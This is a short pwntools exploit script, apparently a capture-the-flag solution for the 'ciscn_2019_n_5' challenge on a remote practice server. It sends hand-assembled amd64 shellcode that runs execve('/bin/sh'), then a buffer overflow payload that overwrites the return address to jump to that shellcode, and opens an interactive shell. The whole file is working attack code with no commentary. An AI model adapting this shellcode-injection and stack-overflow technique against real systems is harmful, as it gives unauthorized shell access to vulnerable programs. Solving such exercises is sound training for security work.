from pwn import *

#io = process('./ciscn_2019_n_5')
io = remote('node4.buuoj.cn',28287)
context.log_level = 'debug'
raw_input()

name = 0x601080
context.arch = 'amd64'
#sc = asm(shellcraft.sh())
sc = asm('''
        mov rbx, 0x68732f6e69622f 
        push rbx 
        mov rdi, rsp 
        xor rsi, rsi 
        xor rdx, rdx 
        mov rax, 0x3b 
        syscall
                 ''')
payload = b'\x61' * 0x20 + b'\x62' * 8 + p64(name)

io.recvuntil(b'name')
io.send(sc)
io.recvuntil(b'me?')
io.sendline(payload)

io.interactive()
